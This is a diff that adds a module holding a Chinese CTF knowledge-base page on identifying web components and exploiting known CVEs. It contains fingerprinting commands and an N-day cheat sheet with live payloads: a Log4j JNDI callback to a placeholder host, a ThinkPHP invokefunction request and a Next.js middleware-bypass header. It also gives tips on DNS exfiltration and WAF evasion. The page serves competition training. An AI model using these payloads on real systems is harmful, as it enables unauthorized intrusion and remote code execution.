@@ -1,0 +1,239 @@
+const n="Web-CVE复现与已知漏洞利用",e="Web-CVE复现与已知漏洞利用",t="一道 Web 题没给源码、也没给明显逻辑漏洞时，先别急着 fuzz。**流程是：识别组件（指纹）→ 定位版本 → 版本映射到已知 CVE → 取公开 PoC → 按目标环境适配 → 打通**。本页解决「怎么知道该打哪个 N-day」与「PoC 为什么在你手上跑不通」。",o=`# Web-CVE复现与已知漏洞利用
+
+> 一道 Web 题没给源码、也没给明显逻辑漏洞时，先别急着 fuzz。**流程是：识别组件（指纹）→ 定位版本 → 版本映射到已知 CVE → 取公开 PoC → 按目标环境适配 → 打通**。本页解决「怎么知道该打哪个 N-day」与「PoC 为什么在你手上跑不通」。
+
+## 一、总流程
+
+\`\`\`
+响应头/报错页/cookie名/路径/静态资源版本号
+        │  指纹识别
+        ▼
+   【组件: 版本】  ──版本区间比对──▶  CVE 候选列表
+        │                              │
+        │  行为验证（无害探测）          │  取公开 PoC
+        ▼                              ▼
+  确认版本未打补丁  ──────────────▶  适配（回显/反连/编码/依赖）
+                                        │
+                                        ▼
+                                     打通拿 flag
+\`\`\`
+
+**三条铁律**：
+1. **先确认组件，再谈 CVE**。同一路径（如 \`/actuator\`）在多个框架里出现，别急着下结论。
+2. **版本是「区间」不是「等号」**：N-day 靠「版本落入受影响区间」判定，且很多题故意用**未打补丁的中间版本**。
+3. **公开 PoC ≠ 即插即用**：几乎每个 PoC 都要改回连地址、改编码、补依赖、按目标环境选回显或反连。
+
+## 二、指纹识别（命令速查）
+
+| 手段 | 命令 | 主要产出 |
+|---|---|---|
+| 主动识别 | \`whatweb -a3 https://target\` | 框架、CMS、版本、插件 |
+| 批量/HTTP 层 | \`httpx -u https://target -tech-detect -title -status-code -favicon\` | 技术栈、标题、favicon hash |
+| 端口/服务版本 | \`nmap -sV -p- target\` | 中间件名与版本字符串 |
+| 响应头 | \`curl -sI https://target\` | \`Server\`、\`X-Powered-By\`、\`Set-Cookie\` 名 |
+| 报错页 | 触发 500/404，看堆栈/框架模板 | 框架名 + 版本、模板路径 |
+| 静态资源 | \`curl -s https://target/static/…\` 看文件名里的版本号 | 精确版本（如 \`vue.2.6.14.min.js\`） |
+| favicon | 取 \`/favicon.ico\` 算 hash，比对公开指纹库 | 在**版本字符串被藏掉**时靠图标认组件 |
+| CMS 专用 | \`/readme.html\`、\`/CHANGELOG.md\`、\`/wp-content/plugins/*/readme.txt\` | CMS/插件版本 |
+
+\`\`\`bash
+# 一次性打包常见探测
+whatweb -a3 "$T"
+curl -sI "$T"
+nmap -sV -p- --min-rate 1000 "$T"
+httpx -u "$T" -tech-detect -favicon -json | jq .
+\`\`\`
+
+\`\`\`python
+# favicon hash（配合公开指纹库/Shodan 检索用）
+# 依赖: pip install mmh3 requests
+import mmh3, requests, codecs, base64
+r = requests.get("http://target/favicon.ico", timeout=5)
+b64 = base64.encodebytes(r.content)
+print(mmh3.hash(b64))   # 用这个整数去比对已知组件的 favicon 指纹
+\`\`\`
+
+### 响应头 / cookie 名 → 组件判据（最省事的一招）
+
+| 观察 | 高度怀疑 |
+|---|---|
+| \`Server: Apache-Coyote/1.1\` | Tomcat |
+| \`Set-Cookie: JSESSIONID=…\` | Java 栈（Tomcat / Spring / Shiro 都可能，结合路径） |
+| \`Set-Cookie: rememberMe=deleteMe\` | **Shiro**（rememberMe 反序列化系） |
+| \`Set-Cookie: PHPSESSID\` | PHP 栈 |
+| \`Set-Cookie: thinkphp_*\` 或 \`X-Powered-By: ThinkPHP\` | ThinkPHP |
+| \`X-Powered-By: Express\` | Node/Express |
+| \`Server: nginx\` + 大量静态路径 | Nginx，看是否有解析/别名配置问题 |
+| \`Set-Cookie: XSRF-TOKEN\` / \`_csrf\` | Spring Security |
+| 报错里出现 \`Whitelabel Error Page\` | Spring Boot |
+
+### 路径 → 组件判据
+
+| 路径 | 组件 |
+|---|---|
+| \`/actuator\` \`/actuator/env\` \`/actuator/health\` | Spring Boot Actuator（信息泄露/后续利用） |
+| \`/druid/index.html\` | Druid 监控台（信息泄露、弱口令） |
+| \`/manager/html\` \`/host-manager/html\` | Tomcat 管理台 |
+| \`/solr/\` \`/solr/admin\` | Apache Solr |
+| \`/nacos/\` \`/nacos/v1/auth/…\` | Alibaba Nacos |
+| \`/index.php?s=/…\` | ThinkPHP（5.x 兼容路由） |
+| \`/wp-login.php\` \`/wp-json/\` \`/wp-content/\` | WordPress |
+| \`/administrator/\` \`/components/\` | Joomla |
+| \`/jenkins/\` \`/script\` | Jenkins |
+| \`/_next/\` \`/_rsc\` \`Next-Action\` 头 | Next.js（含 CVE-2025-29927 middleware 绕过） |
+
+## 三、版本比对：从指纹到 CVE 候选
+
+拿到「组件 + 版本区间」后，做两件事：
+
+1. **区间匹配**：把版本号与 CVE 的受影响区间对齐。例：Shiro \`CVE-2016-4437\` 影响 \`<= 1.2.4\`；Fastjson autotype 问题随 \`1.2.x\` 小版本不断修补，落在哪个补丁点决定用哪条链。
+2. **行为验证（无害优先）**：版本字符串可能被伪装，用**目标行为**验证。
+   - Shiro：带一个**恒定**的 \`rememberMe=deleteMe\` 请求，看响应是否回 \`rememberMe=deleteMe\` → 说明这是 Shiro 且版本 = 提供了该 header。
+   - Spring Boot：\`/actuator/env\` 是否可无认证访问。
+   - Struts2：带 \`?redirect:\`、\`\${…}\`、OGNL 表达式看是否被求值（用算术表达式验证，不执行命令）。
+
+\`\`\`bash
+# Shiro 存在性探测（不触发反序列化，只是看它认不认 rememberMe）
+curl -sI "http://target/" -H 'Cookie: rememberMe=deleteMe' | grep -i rememberMe
+\`\`\`
+
+> **别一上手就打 payload**。先用「无害行为」确认版本前提，再上验证性 payload；不少题在 \`/_\` 或 \`Content-Type\` 上做了区分，乱打反而暴露。
+
+## 四、N-day 族速查表（按组件）
+
+| 组件 | 指纹 | 代表 CVE / 利用点 | 一句话打法 |
+|---|---|---|---|
+| **Tomcat** | Coyote 头 / \`/manager/html\` / 400 页 | CVE-2017-12615（PUT 任意写 JSP）、CVE-2020-1938（AJP Ghostcat，读任意文件/含 RCE）、manager 弱口令 → war 部署 | PUT 写 \`.jsp\`（注意 \`readonly\` 与含 \`%20\`/\`::$DATA\` 的后缀绕过）；AJP 走 8009 |
+| **Nginx** | \`Server: nginx\` | CVE-2017-7529（range 整数溢出读缓存内存）、别名/路径解析错误、CVE-2019-20372（error_page 配置） | 构造 \`Range: bytes=-…\` 越界读缓存，泄漏上游响应/内存 |
+| **Struts2** | \`.action\`/\`.do\` 后缀、OGNL 报错 | S2-045/046（Content-Type OGNL）、S2-057（\`\${…}\` namespace）、S2-052（REST XStream） | OGNL 表达式注入，回显或反连 |
+| **Fastjson** | Java 栈 + JSON 接口 | autotype 反序列化（\`1.2.24\` 起多轮绕过） | \`@type\` + gadget 链；注意目标 fastjson 小版本决定用哪条绕过 |
+| **Log4j2** | Java 应用、日志里可能打印输入 | CVE-2021-44228（JNDI 注入） | 输入 \`\${jndi:ldap://<自己的服务器>/x}\`，命中则 DNS/LDAP 反连 |
+| **Spring** | Actuator / Whitelabel 页 | CVE-2022-22947（Cloud Gateway SPEL RCE）、CVE-2022-22965（Spring4Shell，改 Tomcat AccessLogValve 写 JSP）、CVE-2022-22963（Cloud Function SpEL） | 按暴露面选：Gateway 打 actuator + SPEL；MVC 打参数绑定写 JSP |
+| **ThinkPHP** | \`/index.php?s=\` / \`X-Powered-By: ThinkPHP\` | 5.0.23 RCE、5.1.x 多版本、2.x 兼容模式 | \`?s=index/\\think\\app/invokefunction&function=call_user_func_array…\` 类 |
+| **Shiro** | \`rememberMe\` cookie | CVE-2016-4437（rememberMe AES 反序列化，密钥常在源码/默认）、CVE-2020-1957（路径认证绕过） | 有默认 key 就造恶意 rememberMe，触发 CommonsBeanutils 链 RCE |
+| **Next.js** | \`/_next/\`、\`Next-Action\` 头 | CVE-2025-29927（\`x-middleware-subrequest\` 绕过中间件鉴权）、Flight 反序列化 | 加 \`x-middleware-subrequest: middleware:middleware:…\` 直达受保护路由 |
+| **Jenkins** | \`/jenkins/\` | 脚本控制台未授权、CVE-2024-23897（CLI 任意文件读） | 未授权 \`/script\` 直接 Groovy；或 CLI 文件读 |
+| **Nacos / Druid / Solr / Grafana** | 各自管理台路径 | 未授权访问 → 配置/凭据泄露 → 后续 RCE | 先拿信息/凭据，再找该组件的默认功能 RCE |
+| **WordPress / Joomla / Drupal** | CMS 路径 | 插件/主题已知漏洞、\`wp-config.php\` 泄露 | 认插件版本 → 找插件 CVE；拿到 DB 凭据后 \`load_file()\` 读任意文件 |
+
+\`\`\`bash
+# 一条线索链示例（Java 栈）：
+curl -sI "$T" | grep -i "coyote\\|jsessionid"      # 怀疑 Tomcat
+curl -sI "$T" -H 'Cookie: rememberMe=deleteMe' | grep -i rememberMe  # 是不是 Shiro
+curl -s  "$T/actuator" ; curl -s "$T/actuator/env"  # 有没有 Spring 泄露
+\`\`\`
+
+## 五、可跑骨架
+
+\`\`\`python
+#!/usr/bin/env python3
+# 依赖: pip install requests
+# 用途：对单个目标做「无害」指纹与前提确认，不触发任何破坏性 payload
+import requests, re, sys
+
+T = sys.argv[1].rstrip('/')
+s = requests.Session()
+
+def hdr(p="/"):
+    try: return requests.get(T+p, timeout=6, allow_redirects=False).headers
+    except Exception as e: return {}
+
+def probe():
+    h = hdr()
+    joined = "\\n".join(f"{k}: {v}" for k, v in h.items())
+    print("== headers =="); print(joined)
+
+    # 组件判据
+    if re.search(r"rememberMe", joined, re.I): print("[!] 疑似 Shiro")
+    if h.get("Server","").lower().startswith("nginx"): print("[!] Nginx")
+    if "JSESSIONID" in joined: print("[!] Java 栈（Tomcat/Spring/Shiro 视路径）")
+    if "thinkphp" in joined.lower(): print("[!] ThinkPHP")
+
+    # 路径探针（只读）
+    for p in ["/actuator", "/actuator/env", "/manager/html", "/solr/",
+              "/druid/index.html", "/nacos/", "/wp-login.php"]:
+        try:
+            r = requests.get(T+p, timeout=5, allow_redirects=False)
+            if r.status_code != 404: print(f"[path] {p} -> {r.status_code}")
+        except Exception: pass
+
+    # Shiro 存在性（无害）：看它是否回 deleteMe
+    try:
+        r = requests.get(T+"/", timeout=5,
+                         headers={"Cookie":"rememberMe=deleteMe"})
+        if "rememberMe=deleteMe" in r.headers.get("Set-Cookie",""):
+            print("[!] Shiro 确认（rememberMe 处理逻辑存在）")
+    except Exception: pass
+
+if __name__ == "__main__":
+    probe()
+\`\`\`
+
+\`\`\`bash
+# Log4j2 探测（只做 DNS 反连验证，用你自己的域名/DNS 日志，别打公共目标）
+# 输入会被写进日志的任意字段试：User-Agent、X-Api-Version、参数值…
+curl -s "$T" -H 'User-Agent: \${jndi:ldap://<你的回连域>/a}'
+# 回连域收到请求 → 命中；再换 LDAP 服务器投喂 gadget（需自建）
+\`\`\`
+
+\`\`\`bash
+# ThinkPHP 5.0.x 无害验证：用 phpinfo 类只读函数，不执行命令
+curl -s "$T/index.php?s=index/\\think\\app/invokefunction&function=phpinfo&vars[0]=1"
+\`\`\`
+
+## 六、公开 PoC 适配：为什么在你手上跑不通
+
+拿到 PoC 后按这张表逐项对齐：
+
+| 差异点 | 常见问题 | 处理 |
+|---|---|---|
+| **版本不匹配** | PoC 针对 1.2.24，目标是已打补丁的小版本 | 按目标精确小版本换绕过链，别硬跑 |
+| **回显 vs 反连** | PoC 假设有回显，目标无回显 | 改用反连（DNS/HTTP），把命令结果编码进域名 |
+| **地址/端口** | PoC 写死 \`127.0.0.1:1389\` | 换成自己的 VPS/隧道地址；注意目标出网策略 |
+| **编码/Content-Type** | 目标对 JSON/form 解析不同 | OGNL/SpEL 场景常要调 \`Content-Type\`；form 端点别发 JSON |
+| **依赖缺失** | PoC 依赖某个 gadget jar / Ysoserial 版本 | 对齐 Java 版本与依赖；用目标 classpath 里**真实存在**的 gadget |
+| **出口受限** | 目标无法出网 / 只允许 DNS | 走 DNS 外带；或先 SSRF 到内网再落 |
+| **WAF/长度限制** | 被拦或截断 | 分块、编码、大小写混写、换等价函数（详见各 payload 的绕过表） |
+
+**判据：PoC 跑不通时，先问「是环境差异还是前提不成立」**——前者改参数，后者说明根本不是这个 CVE，回第三节重新判型。
+
+## 关键点
+
+- **指纹 → 版本 → CVE 区间 → PoC → 适配**是固定顺序；跳过「版本区间比对」直接丢 PoC 是最常见的浪费。
+- **cookie 名与路径是最快的判据**：\`rememberMe\`→Shiro、\`/actuator\`→Spring、\`/index.php?s=\`→ThinkPHP、Coyote 头→Tomcat。
+- **版本字符串会被伪装**：用**无害行为**（Shiro 的 deleteMe 回显、actuator 可读性、OGNL 算术表达式）交叉验证，别只信 header。
+- **N-day 靠「未打补丁的区间」**：同一组件多个 CVE，选哪条由**精确小版本 + 暴露面**共同决定（有 Gateway 走 SPEL，有 MVC 走 Spring4Shell）。
+- **PoC 必须适配环境**：回显/反连、地址、编码、依赖 gadget、出网策略，五项里必有一项要改。
+- **信息泄露常是 N-day 的前置**：Druid/Nacos/Actuator 泄露凭据或配置，再喂给下一个组件的 RCE，形成链。
+
+## 关联
+
+- [[Web-源码泄露与信息收集]] —— 指纹识别与源码/配置泄露是同一阶段，拿到版本号本身就是信息收集的产出
+- [[Web-反序列化漏洞]] —— Shiro rememberMe、Fastjson autotype、Node Flight 都是反序列化 N-day 的具体载体
+- [[Web-命令执行与SSTI]] —— Struts2 OGNL、Spring SPEL、Log4j JNDI 收尾都属于命令执行/表达式注入
+- [[Web-认证与会话漏洞]] —— CVE-2025-29927、Shiro 路径绕过、Jenkins 未授权都是鉴权绕过类 N-day
+- [[Web-客户端攻击与前端安全]] —— 前端框架/库（AngularJS、lodash、happy-dom）的已知漏洞走 N-day 复现更省事，姊妹页
+- [[Web-请求走私与协议层攻击]] —— Nginx 解析/缓存类 CVE 与走私同属协议层，判据常共用
+- [[Web-SQL注入]] —— CMS 插件（如 WordPress 系列）的 N-day 常以 SQLi/文件上传为入口
+- [[CTF-竞赛总览与解题流程]] —— 「先分类再动手」在 Web 上的具体化：本页就是 N-day 方向的分类表
+
+## 存疑 / 矛盾
+
+- **版本号未必是版本号**：\`X-Powered-By\`、\`Server\` 都能被反向代理改写或伪造；favicon hash、静态资源文件名、报错堆栈往往比它更可信。**声明版与真实版不一致时，以行为验证为准**。
+- **「有 /actuator」不等于「一定能利用」**：端点可能被 Spring Security 保护或只暴露 \`health\`；先 \`GET\` 看返回，再谈 env/heapdump。
+- **Shiro 的 key 不是通用的**：CVE-2016-4437 需要一个（常为默认的）AES key；key 换过就直接失效。别把「存在 Shiro」等同于「能反序列化」。
+- **本页不写具体凭据/口令**：默认口令、DB 密码、密钥这类**一律按环境现取**（\`wp-config.php\`、\`application.yml\`、环境变量），写死在笔记里既会过期又违反红线。表中只写「机制」不写「值」。
+- **PoC 的「可用版本」区间经常比官方公告宽或窄**：公告说 \`<= x\`，实际能否打通取决于小版本补丁与依赖；以本机/靶机实测为准。
+- **N-day 与 0-day 的界限会移动**：新 CVE（如 CVE-2025-29927、Node Flight 反序列化）出来后，公开 PoC 需要时间沉淀；题目用「刚出的 CVE」时，往往要自己看公告写 PoC，而不是搜现成的。
+- **主动探测有副作用**：\`whatweb -a3\`、大量路径爆破会对目标产生明显流量，CTF 环境里可能触发 WAF/封 IP；靶场里也要注意别把服务打挂（尤其是 Struts/Log4j 的验证性 payload）。
+
+## 来源
+
+- 糯米内建知识整理 · 2026-10-03（无外部文件）
+
+## 附：来源技能文件（供主控核对，非 Obsidian 链接）
+
+- [cves.md](../../01-原料/收藏/技能文档/ctf-web/cves.md) — 具体 CVE 复现与检测清单（原在库外 \`~/.claude/skills/\`，2026-10-03 归档入库）
+- [node-and-prototype.md](../../01-原料/收藏/技能文档/ctf-web/node-and-prototype.md) — Node 侧 CVE：flatnest、happy-dom、vm2（原在库外，2026-10-03 归档入库）
+- 常规 CTF 平台 N-day 品种：Tomcat / Nginx / Struts2 / Fastjson / Log4j / Spring / ThinkPHP / Shiro / Jenkins / CMS
+`,r="concept",a="web",i={internal:["CTF-竞赛总览与解题流程","Web-SQL注入","Web-反序列化漏洞","Web-命令执行与SSTI","Web-客户端攻击与前端安全","Web-源码泄露与信息收集","Web-认证与会话漏洞","Web-请求走私与协议层攻击"],unresolvedCount:0},s={name:n,title:e,summary:t,content:o,section:r,group:a,links:i};export{o as content,s as default,a as group,i as links,n as name,r as section,t as summary,e as title};
